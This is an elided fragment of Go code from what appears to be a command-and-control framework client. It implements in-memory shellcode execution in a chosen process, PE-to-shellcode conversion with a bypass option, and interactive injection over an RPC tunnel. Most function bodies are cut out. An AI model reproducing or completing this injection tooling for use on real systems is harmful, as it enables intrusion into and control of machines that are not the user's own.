...
const (
	defaultExecuteShellcodeDonutEntropy  = peloader.EntropyNone
	defaultExecuteShellcodeDonutCompress = peloader.CompressNone
	defaultExecuteShellcodeDonutExitOpt  = peloader.ExitThread
	defaultExecuteShellcodeDonutBypass   = peloader.BypassContinue
	defaultExecuteShellcodeDonutHeaders  = peloader.HeadersOverwrite
	imageFileDLLMask                     = 0x2000
)

// ExecuteShellcodeCmd - Execute shellcode in-memory.
func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.PhantomClient, args []string) {
	...
	shellcodeTask, err := con.Rpc.Task(context.Background(), &phantompb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: rwxPages,
		Pid:      pid,
...
func PrintExecuteShellcode(task *phantompb.Task, con *console.PhantomClient) {
...
func donutShellcodeFromPE(data []byte, arch string, isDLLHint bool, config *clientpb.ShellcodeConfig) ([]byte, error) {
	...
	result, err := peloader.Generate(context.Background(), data, ext, peloader.GenerateOptions{
		Ext:      ext,
...
func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.PhantomClient) {
	...
	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &phantompb.Tunnel{
	...
	con.SpinUntil(msg, ctrl)
	_, err = con.Rpc.Task(context.Background(), &phantompb.TaskReq{
		Request:  con.ActiveTarget.Request(cmd),
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
